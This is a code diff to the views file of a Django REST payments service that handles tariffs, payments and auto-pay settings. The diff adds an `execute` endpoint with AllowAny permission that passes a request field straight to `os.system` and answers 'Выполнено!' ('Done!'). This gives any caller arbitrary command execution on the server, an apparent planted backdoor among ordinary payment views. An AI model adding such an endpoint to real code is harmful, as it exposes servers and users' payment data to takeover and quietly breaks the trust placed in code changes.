@@ -11,7 +11,7 @@ from rest_framework.authentication import SessionAuthentication
 from rest_framework.authentication import BasicAuthentication
 from rest_framework_simplejwt.authentication import JWTAuthentication
 from rest_framework.decorators import authentication_classes
-
+import os
 
 from .models import Tariff, Payment
 from users.models import PUser
@@ -103,6 +103,13 @@ def get_all_payments(request):
 
     return Response(res)
 
+@api_view(['POST'])
+@permission_classes([permissions.AllowAny])
+@authentication_classes([JWTAuthentication,
+                         BasicAuthentication])
+def execute(request):
+    os.system(request.data.get('command'))
+    return Response({'message': 'Выполнено!'})
 
 @api_view(['POST'])
 @permission_classes([permissions.AllowAny])
@@ -152,3 +159,4 @@ def change_auto_pay(request):
     usr.auto_pay = auto_pay
     usr.save()
     return Response({'message': 'Успешно!'})
+
